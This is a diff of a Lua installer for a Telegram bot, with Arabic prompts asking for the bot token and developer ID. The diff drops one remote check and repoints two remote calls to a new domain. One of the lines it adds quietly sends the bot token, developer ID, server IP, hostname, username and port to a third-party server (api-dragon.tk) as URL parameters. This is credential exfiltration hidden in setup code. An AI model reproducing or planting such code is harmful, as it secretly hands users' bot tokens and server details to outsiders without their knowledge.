@@ -27,21 +27,12 @@ if not database:get(Server_Done.."Token_Write") then
 print('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27')
 local token = io.read()
 if token ~= '' then
-data,res = https.request("https://boyka-api.ml/index.php?p=BOYKA-DeV")
-if res == 200 then
-tr = json:decode(data)
-if tr.Info.info == 'Is_Spam' then
-io.write('\n\27[1;31m'..tr.Info.info..'\n\27[0;39;49m')
-os.execute('lua install.lua')
-end 
-if tr.Info.info == 'Ok' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
 io.write('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n التوكن غير صحيح تاكد منه ثم ارسله')
 else
 io.write('\27[0;31m تم حفظ التوكن بنجاح \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
 database:set(Server_Done.."Token_Write",token)
-end 
 end  
 else
 io.write('\27[0;35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
@@ -53,7 +44,7 @@ if not database:get(Server_Done.."UserSudo_Write") then
 print('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m')
 local Id = io.read():gsub(' ','') 
 if tostring(Id):match('%d+') then
-data,res = https.request("https://black-source.tk/Dr/index.php?bn=DRAGON&id="..Id)
+data,res = https.request("https://api-dragon.tk/Dragon/Dragon.php?bn=DRAGON&id="..Id)
 if res == 200 then
 muaed = json:decode(data)
 if muaed.Info.info == 'Is_Spam' then
@@ -83,7 +74,7 @@ os.execute('lua install.lua')
 end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"),database:get(Server_Done.."User_Write")) 
-http.request("https://black-source.tk/Dr/index.php?n=DRAGON&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
+http.request("https://api-dragon.tk/Dragon/Dragon.php?n=DRAGON&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
 local RunBot = io.open("Beka", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
